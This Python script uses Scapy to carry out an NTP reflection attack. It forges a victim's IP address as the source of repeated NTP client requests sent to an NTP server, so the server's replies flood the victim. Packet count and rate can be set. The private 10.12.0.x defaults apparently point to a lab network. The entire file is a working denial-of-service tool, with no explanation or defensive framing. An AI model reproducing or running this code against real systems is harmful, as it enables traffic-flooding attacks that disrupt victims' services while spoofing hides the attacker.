#!/usr/bin/env python3

from scapy.all import IP, UDP, Raw, send, conf
import argparse
import random
import time

conf.verb = 0

parser = argparse.ArgumentParser(description="NTP reflection attack with spoofed source IP")
parser.add_argument("--ntp", default="10.12.0.30", help="NTP server IP")
parser.add_argument("--victim", default="10.12.0.10", help="Spoofed victim IP")
parser.add_argument("--count", type=int, default=200, help="Number of packets")
parser.add_argument("--rate", type=float, default=50, help="Packets per second")
args = parser.parse_args()

# Minimal NTP client request: LI=0, VN=3, Mode=3
ntp_payload = b"\x1b" + b"\x00" * 47

print("[+] NTP reflection attack")
print(f"[+] Reflector NTP server : {args.ntp}")
print(f"[+] Spoofed victim       : {args.victim}")
print(f"[+] Packets              : {args.count}")
print(f"[+] Rate                 : {args.rate} pkt/s")

delay = 1.0 / args.rate if args.rate > 0 else 0

for i in range(args.count):
    sport = random.randint(1024, 65535)

    packet = (
        IP(src=args.victim, dst=args.ntp)
        / UDP(sport=sport, dport=123)
        / Raw(load=ntp_payload)
    )

    send(packet)

    if delay > 0:
        time.sleep(delay)

print("[+] Attack finished")